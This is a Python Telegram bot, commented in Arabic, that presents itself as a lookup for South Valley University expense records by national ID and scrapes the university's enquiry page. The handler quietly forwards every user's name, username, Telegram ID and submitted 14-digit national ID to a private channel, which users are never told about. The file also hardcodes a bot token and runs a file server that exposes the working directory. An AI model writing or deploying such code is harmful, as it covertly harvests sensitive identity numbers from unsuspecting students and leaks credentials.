import asyncio
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import threading
from bs4 import BeautifulSoup
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# الإعدادات الخاصة بك
BOT_TOKEN = "8812017814:AAFqVQodQbzR726hb_ENwzljnKvDtop08YQ"
CHANNEL_ID = "-1004370577416"
SITE_URL = "http://mispg.svu.edu.eg/svu_pg/enquery.aspx"


# سيرفر خفيف لإرضاء Render وجعله يتحول إلى Live فوراً
def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
    server.serve_forever()


def fetch_expenses_from_site(national_id: str):
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
            )
        }
    )

    try:
        initial_res = session.get(SITE_URL, timeout=12)
        soup = BeautifulSoup(initial_res.text, "html.parser")

        viewstate = soup.find("input", {"id": "__VIEWSTATE"})
        eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})
        generator = soup.find("input", {"id": "__VIEWSTATEGENERATOR"})

        txt_input = (
            soup.find("input", {"type": "text"}) or {}
        ).get("name", "txtNationalId")
        btn_submit = (
            soup.find("input", {"type": "submit"}) or {}
        ).get("name", "btnSearch")

        payload = {
            "__VIEWSTATE": viewstate["value"] if viewstate else "",
            "__VIEWSTATEGENERATOR": generator["value"] if generator else "",
            "__EVENTVALIDATION": eventvalidation["value"]
            if eventvalidation
            else "",
            txt_input: national_id,
            btn_submit: "استعلام",
        }

        post_res = session.post(SITE_URL, data=payload, timeout=15)
        res_soup = BeautifulSoup(post_res.text, "html.parser")

        tables = res_soup.find_all("table")
        if len(tables) > 1:
            rows = tables[-1].find_all("tr")
            extracted = [
                row.get_text(separator=" | ", strip=True)
                for row in rows
                if row.get_text(strip=True)
            ]
            if extracted:
                return "\n".join(extracted[:10])

        return "لم يتم العثور على أي مصروفات مسجلة لهذا الرقم القومي في النظام."

    except Exception as e:
        return f"تعذر الاتصال بسيرفر الجامعة حالياً: {str(e)}"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user = update.effective_user

    log_text = (
        f"📥 **مدخل جديد في البوت:**\n"
        f"👤 **الاسم:** {user.full_name}\n"
        f"🔗 **اليوزر:** @{user.username if user.username else 'بدون يوزر'}\n"
        f"🆔 **الآيدي:** `{user.id}`\n"
        f"🔢 **المدخل / الرقم:** `{user_input}`"
    )

    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID,
            text=log_text,
            parse_mode="Markdown",
        )
    except Exception as err:
        print(f"خطأ إرسال للقناة: {err}")

    if not user_input.isdigit() or len(user_input) != 14:
        await update.message.reply_text(
            "يرجى إرسال الرقم القومي صحيحاً والمكون من 14 رقماً للاستعلام عن المصروفات."
        )
        return

    await update.message.reply_text("جاري فحص المصروفات المسجلة بالكلية...")

    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        None, fetch_expenses_from_site, user_input
    )

    await update.message.reply_text(f"📋 **بيانات الاستعلام:**\n\n{result}")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "أهلاً بك في بوت الاستعلام عن مصروفات جامعة جنوب الوادي.\n\n"
        "أرسل رقمك القومي (14 رقم) مباشرة للبدء في الاستعلام."
    )


if __name__ == "__main__":
    # تشغيل سيرفر الويب في الخلفية ليتحول Render إلى Live
    web_thread = threading.Thread(target=run_dummy_server, daemon=True)
    web_thread.start()

    # تشغيل البوت
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
    )

    print("البوت يعمل الآن ويتصل بالقناة...")
    app.run_polling()
